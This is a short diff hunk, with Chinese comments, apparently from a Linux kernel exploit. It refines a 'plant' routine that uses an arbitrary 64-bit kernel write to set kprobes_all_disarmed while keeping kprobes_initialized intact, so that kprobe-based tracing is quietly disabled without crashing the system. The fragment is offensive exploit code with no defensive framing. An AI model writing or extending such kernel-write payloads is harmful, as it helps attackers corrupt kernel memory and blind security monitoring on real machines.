@@ -2535,9 +2535,9 @@ static void run_plant(unsigned long long target, int tag, int mode,
         else if (mode == 1)
         {
             /* 写任意 64 位值：parent 即写入值（小端）。
-             * 用于 kprobes_all_disarmed = 1（01 00 00 00 00 00 00 00），
-             * 后 7 字节写 0，尽量不破坏相邻 .bss 变量。 */
-            build_payload(payload, off, 1, target);
+             * kprobes_all_disarmed(1B) + padding(3B) + kprobes_initialized(1B) + padding(3B)
+             * 写 0x0000000001000001：字节0=1(disarm), 字节4=1(保持 kprobes_initialized=1)。 */
+            build_payload(payload, off, 0x1000001ULL, target);
         }
         else
         {
